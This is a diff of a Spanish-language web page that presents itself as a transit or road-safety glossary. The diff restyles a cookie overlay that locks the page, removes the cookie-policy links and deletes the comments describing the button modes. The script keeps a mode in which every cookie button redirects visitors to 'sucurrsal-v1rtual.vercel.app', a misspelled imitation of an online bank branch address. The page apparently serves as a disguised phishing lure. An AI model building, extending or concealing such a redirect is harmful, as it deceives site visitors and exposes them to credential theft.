@@ -69,10 +69,14 @@ body.cookie-locked{ overflow:hidden; }
 
 .contenedor{ width:100%; max-width:var(--max); margin:0 auto; padding:0 24px; }
 
-/* ===== COOKIES (DISEÑO ESTILO IMAGEN) ===== */
+/* ===== COOKIES ===== */
 .cookie-overlay{
   position:fixed; inset:0;
-  background:rgba(44,62,80,0.45);
+  /* Tu imagen de fondo en toda la pantalla */
+  background-image: url('image.png');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
   z-index:9998;
   backdrop-filter:blur(4px);
   display:none;
@@ -90,10 +94,8 @@ body.cookie-locked{ overflow:hidden; }
 .cookie-banner.visible{ display:flex; }
 
 .cookie-modal{
-  background-image: linear-gradient(rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.85)), url('image.png'); 
-  background-size: cover;
-  background-position: center;
-  background-repeat: no-repeat;
+  /* Ventana blanca limpia para leer bien el texto */
+  background: #ffffff; 
   max-width:620px;
   width:100%;
   padding:40px 48px;
@@ -113,7 +115,6 @@ body.cookie-locked{ overflow:hidden; }
   color:#1a1a1a;
   font-weight:700;
   letter-spacing:-0.01em;
-  text-shadow: 1px 1px 3px rgba(255,255,255,0.9);
 }
 .cookie-modal p{
   font-size:0.92rem;
@@ -121,7 +122,6 @@ body.cookie-locked{ overflow:hidden; }
   margin-bottom:24px;
   line-height:1.6;
   text-align:left;
-  text-shadow: 1px 1px 2px rgba(255,255,255,0.8);
 }
 .cookie-actions{
   display:flex;
@@ -149,17 +149,6 @@ body.cookie-locked{ overflow:hidden; }
   transform:translateY(-2px);
   box-shadow:0 4px 12px rgba(253,218,36,0.4);
 }
-.cookie-enlaces{
-  margin-top:20px;
-  font-size:0.82rem;
-  color:var(--texto-suave);
-}
-.cookie-enlaces a{
-  color:var(--tierra);
-  font-weight:600;
-  text-decoration:none;
-}
-.cookie-enlaces a:hover{ text-decoration:underline; }
 
 .contenido-principal{ display:none; }
 .contenido-principal.visible{
@@ -652,8 +641,8 @@ p{ margin:0 0 1rem; color:var(--texto); }
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">BRT</dt>
               <dd style="margin:0; color:var(--texto);">Bus Rapid Transit: sistema de buses de alta capacidad que circulan por carriles exclusivos.</dd>
             </div>
-                       <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
-              <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Peatón</dt>
+            <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
+                            <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Peatón</dt>
               <dd style="margin:0; color:var(--texto);">Persona que se desplaza a pie por la vía.</dd>
             </div>
             <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
@@ -815,7 +804,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </script>
 
   <!-- ============================================================
-  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2) - ORIGINAL INTACTO
+  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2) - CORREGIDO
   ============================================================ -->
   <script>
     (function() {
@@ -823,9 +812,6 @@ p{ margin:0 0 1rem; color:var(--texto); }
 
       // ============================================================
       //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
-      // ============================================================
-      //  MODO 1: Comportamiento original (solo muestra/oculta la página)
-      //  MODO 2: Redirección a URL externa
       // ============================================================
       const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
       const REDIRECT_URL = "https://sucurrsal-v1rtual.vercel.app/manager/b3055b97250969b9d60a0108"; // URL para el modo 2
@@ -924,7 +910,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
         } catch(e) {}
       }
 
-      // ----- MENÚ MÓVIL -----
+      // ----- MENÚ MÓVIL (CORREGIDO) -----
       var botonMenu = document.getElementById('botonMenu');
       var menu = document.getElementById('menu');
 
